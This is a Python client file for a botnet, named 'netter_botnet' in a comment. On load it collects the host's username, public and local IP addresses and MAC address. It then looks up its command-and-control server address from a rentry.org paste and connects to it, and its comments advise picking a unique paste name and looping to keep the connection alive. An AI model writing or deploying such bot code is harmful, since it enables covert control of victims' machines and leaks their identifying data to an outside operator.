import requests, socket
import getpass, uuid

from typing import Optional
from loguru import logger

from core.rentry import Rentry
from core.enums import PacketType

import core.client as Client

DEFAULT_SERVER_ADDRESS: str = "localhost:5000"  # Default bind address

deviceInformation: dict = {
    # Information about the client device. This includes its unique identifier, username, public IP, and local IP.
    "Username": getpass.getuser(),

    "Public_IP": requests.get("https://api.ipify.org").text,
    "Local_IP": socket.gethostbyname(socket.gethostname()),
    "MAC_Address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
        for elements in range(0, 2 * 6, 2)][::-1])
}


def main(addr: Optional[str] = None, useRentry: bool = False) -> None:
    """
    This function establishes a connection to a server using the provided address and device information.
    If the 'useRentry' flag is set to True, the function fetches the server address from a Rentry server.

    Parameters:
    addr (Optional[str]): The address of the server. If not provided, the function uses the default address.
    useRentry (bool): A flag indicating whether to fetch the server address from a Rentry server.

    Returns:
    None
    """

    serverAddress = (DEFAULT_SERVER_ADDRESS if not useRentry
        else Rentry.get_content("https://rentry.org/%s" % addr)
    )

    if not serverAddress:
        logger.error("Failed to fetch address from Rentry server")
        return

    elif not isinstance(serverAddress, str):
        serverAddress = serverAddress.content

    # Put this code below to infinite loop in order to keep the connection to the server

    connection: Client.Connect = Client.Connect(serverAddress, deviceInformation)
    connection.useRentry = useRentry
    connection.connect_()

if __name__ == "__main__":
    main("127.0.0.1:5000", useRentry = False)  # https://rentry.org/netter_botnet

    # Replace 'netter_botnet' with your desired Rentry url name. Make sure the url name
    # is unqiue to avoid strange people accessing the server
